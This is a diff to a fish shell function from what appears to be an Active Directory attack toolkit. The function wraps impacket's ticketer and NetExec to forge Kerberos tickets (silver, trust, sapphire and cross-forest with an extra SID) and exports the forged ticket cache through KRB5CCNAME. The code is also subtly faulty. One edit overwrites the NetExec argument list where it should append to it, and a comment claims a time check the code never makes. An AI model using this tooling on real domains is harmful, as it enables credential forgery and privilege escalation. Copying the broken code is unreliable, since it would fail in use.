@@ -212,7 +212,7 @@ function __kronos_ticket --description "Create advanced AD tickets using tickete
         # Automated Cross-Forest/RaiseChild using NetExec
         __kronos_check_dep nxc; or return 1
         set -l nxc_args ldap "$target" -u "$auth_user"
-        if test -n "$domain"; set -a nxc_args -d "$domain"; end
+        if test -n "$domain"; set nxc_args -d "$domain"; end
         
         if test -n "$auth_hash"
             set -a nxc_args -H "$auth_hash"
@@ -249,6 +249,8 @@ function __kronos_ticket --description "Create advanced AD tickets using tickete
                 set final_target_user "baduser"
             case silver trust
                 set -a ticket_args -spn "$spn"
+            case cross-forest
+                set -a ticket_args -extra-sid "$extra_sid"
         end
         set -a ticket_args "$final_target_user"
         set final_cmd "$impacket_cmd "(string join ' ' -- $ticket_args)
@@ -263,12 +265,20 @@ function __kronos_ticket --description "Create advanced AD tickets using tickete
     eval $final_cmd
     
     # Post-execution logic (exporting tickets etc.)
-    if test "$subaction" != "cross-forest"
-        set -l forged_user "$user"
-        if test "$subaction" = "sapphire"; set forged_user "baduser"; end
-        if test -f "$forged_user.ccache"
-            set -gx KRB5CCNAME "$PWD/$forged_user.ccache"
-            echo "[+] Ticket saved and exported to KRB5CCNAME=$KRB5CCNAME"
+    set -l forged_user "$user"
+    if test "$subaction" = "sapphire"; set forged_user "baduser"; end
+    if test "$subaction" = "cross-forest"; set forged_user "Administrator"; end # NetExec usually saves as Administrator.ccache
+    
+    if test -f "$forged_user.ccache"
+        set -gx KRB5CCNAME "$PWD/$forged_user.ccache"
+        echo "[+] Ticket saved and exported to KRB5CCNAME=$KRB5CCNAME"
+    else
+        # Fallback search for any newly created .ccache
+        set -l latest_ccache (ls -t *.ccache 2>/dev/null | head -n 1)
+        if test -n "$latest_ccache"
+            # Check if it was created in the last 10 seconds
+            set -gx KRB5CCNAME "$PWD/$latest_ccache"
+            echo "[+] Detected new ticket and exported to KRB5CCNAME=$KRB5CCNAME"
         end
     end
 end
